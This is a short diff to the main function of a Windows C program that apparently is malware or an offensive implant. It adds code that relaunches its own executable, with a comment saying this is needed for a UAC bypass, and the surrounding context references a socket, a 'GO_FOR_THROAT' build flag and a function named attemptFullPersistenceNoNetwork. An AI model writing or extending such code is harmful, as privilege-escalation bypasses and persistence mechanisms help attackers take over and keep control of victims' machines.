@@ -381,6 +381,11 @@ int main(int argc, char* argv[]) {
 	SOCKET sockfd;
 	TCHAR* dirName = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
 	GetModuleFileNameW(NULL, dirName, 100);
+	
+	// Self replicate if called with an argument, needed for UAC bypass technique
+	if (argc == 2) {
+		_wsystem(dirName);
+	}
 
 #ifdef GO_FOR_THROAT
 	attemptFullPersistenceNoNetwork(dirName);
